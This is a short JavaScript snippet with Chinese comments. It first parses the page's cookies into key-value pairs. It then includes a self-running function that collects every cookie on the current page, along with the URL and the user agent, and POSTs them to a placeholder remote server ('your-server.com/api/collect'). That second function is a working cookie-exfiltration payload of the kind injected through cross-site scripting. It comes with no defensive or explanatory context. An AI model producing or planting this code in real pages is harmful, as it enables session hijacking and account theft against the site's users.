//示例：获取cookie并序列化为键值对输出
//使用document.cookie获取当前页面上的所有cookie
function parseCookies() {
   const cookieArray = document.cookie.split("; ");
   const cookieObject = {};
   cookieArray.forEach(cookie => {
       const [key, value] = cookie.split("=");
       cookieObject[key] = value;
   });
   return cookieObject;
}

// 示例：解析并打印所有 Cookie
console.log(parseCookies());

// 获取当前页面所有 Cookie 并发送到远程服务器
(function() {
    const cookies = document.cookie;
    const targetUrl = 'https://your-server.com/api/collect'; // Your server address

    fetch(targetUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            url: window.location.href,
            cookies: cookies,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        }),
        // 注意：如果目标服务器跨域，需要服务器支持 CORS
        mode: 'cors'
    })
    .then(response => console.log('发送成功:', response.status))
    .catch(error => console.error('发送失败:', error));
})();
